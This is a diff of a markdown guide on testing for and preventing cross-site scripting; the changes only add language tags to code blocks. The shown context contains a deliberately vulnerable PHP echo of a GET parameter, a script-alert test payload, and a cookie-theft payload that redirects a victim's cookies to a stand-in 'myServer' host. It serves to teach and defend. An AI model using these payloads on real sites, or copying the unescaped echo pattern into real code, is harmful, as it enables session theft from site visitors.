@@ -54,13 +54,13 @@ Client XSS occurs when `untrusted data` is used to update the `DOM` with an unsa
 ## How to test for XSS 
 * `Graybox` test is the best way to test for XSS. Each HTTP data input and printed after could possibly be an XSS attack vector if the input is not escapped. 
 For example this code is vulnerable.
-```
+```PHP
     <?php
     echo 'Hello <h1>' .$_GET["name"]. '!</h1>';
     ?>
 ```
 If the value of name is ```</h1><script>alert('xss');</script><h1>``` the browser will get the following answer from the server 
-```
+```HTML
     <h1>!</h1>
     <script>alert('xss');</script>
     <h1></h1>
@@ -81,7 +81,7 @@ From all the website submits listed, test with HTML chars (html entities), and l
 ### Example 1 : cookie theft 
 This code will send the cookie of the user who visit the website containing this payload. 
 
-```
+```HTML
     <img src="nonExistImg" onerror="myFunction()"/>
     <script>function myFunction(){
 	window.location = "http://myServer/?cookie".concat("=", document.cookie);
@@ -91,7 +91,7 @@ This code will send the cookie of the user who visit the website containing this
 
 ### Example 2 : XSS with weak js function 
 
-```	
+```Javascript
     myFunction(){
 	myImg.src = document.getElementById('imgId').value; 
 	document.body.appendChild(myImg); 
@@ -251,7 +251,7 @@ Assert.That(sanitized, Is.EqualTo(@"<div style=""background-color: test"">"
 ```
 
 ##### Example
-```
+```C#
 using System;
 using Ganss.XSS;
 
